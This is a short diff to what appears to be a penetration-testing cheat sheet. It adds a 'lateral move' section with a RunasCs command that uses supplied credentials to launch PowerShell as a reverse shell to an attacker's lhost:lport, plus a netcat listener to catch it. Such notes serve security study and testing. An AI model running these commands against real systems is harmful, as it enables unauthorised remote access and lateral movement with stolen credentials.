@@ -360,6 +360,11 @@ Invoke-AllChecks
 ```
 check zip,gz,7z,stix,rar files
 ```
+##### Runascs to lateral move 
+```
+runascs.exe username password powershell.exe -r lhost:lport
+nc -nlvp 7777
+```
 
 ### Linux
 ##### Directory Permissions
